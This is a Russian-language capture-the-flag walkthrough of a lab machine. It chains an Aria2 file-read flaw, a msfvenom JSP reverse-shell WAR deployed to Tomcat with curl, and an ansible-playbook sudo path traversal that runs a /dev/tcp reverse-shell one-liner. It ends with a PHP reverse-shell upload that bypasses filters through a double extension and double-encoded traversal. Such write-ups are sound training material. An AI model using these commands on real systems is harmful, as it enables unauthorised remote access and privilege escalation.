для доступа к сайту добавим target ip и domain в /etc/hosts


8888 port - Aria2 WebUI
8080 port - tomcat

CVE-2023-39141 позволяет получить LFI на Aria2

![](../attachment/Pasted%20image%2020250226173306.png)

Получаем доступ к пользователю tomcat с ролью manager-script. Обычным способом залить шелл не получится поэтому используем curl
1. создаем шелл  msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.21.61.35 LPORT=6655 -f war > shell.war
2.  curl -T "shell.war" -u $user:$pass "http://10.10.75.15:8080/manager/text/deploy?path=/app&update=true

![](../attachment/Pasted%20image%2020250226173628.png)
Забираем первый флаг 
![](../attachment/Pasted%20image%2020250226174326.png)

tomcat может использовать задачи для ansible-playbook от пользователя wilbur без пароля
1. создадим правило и загрузим его на машину через wget в папку /tmp (тк нет прав на запись в папку с задачами)
```
- hosts: localhost
  tasks:
    - name: RShell
      command: bash /tmp/test.sh

```
2.  создадим скрипт, который будет выполняться echo '/bin/bash -i >& /dev/tcp/10.21.61.35/5566 0>&1' > /tmp/test.sh
3.  sudo -u wilbur /usr/bin/ansible-playbook /opt/test_playbooks/../../tmp/unl.yml
Получив доступ в домашней директории находим пароль для wilbur и информации о наличие сайта, а также доступ к нему
![](../attachment/Pasted%20image%2020250226174206.png)

![](../attachment/Pasted%20image%2020250226174437.png)

Для доступа к сайту сделать ssh туннель  ssh  -L 6653:127.0.0.1:80 wilbur@backtrack.thm

На сайте есть возможность загружать файлы php с помощью двойного расширения .png.php

создадим shell.png.php в который запишем шелл PHP PentestMonkey (revshells)

При обычный загрузке он попадает в папку uploads и не возвращает шелл. Для того чтобы выбраться из папки обычный LFI не подошел 
![](../attachment/Pasted%20image%2020250226174954.png)
Попробуем добавить в имя файла  двойное кодирование для ../  %252e%252e%252fshell.png.php 

Загружаем на сайт и переходим http://127.0.0.1:6653/shell.png.php. Забираем второй флаг
![](../attachment/Pasted%20image%2020250226175217.png)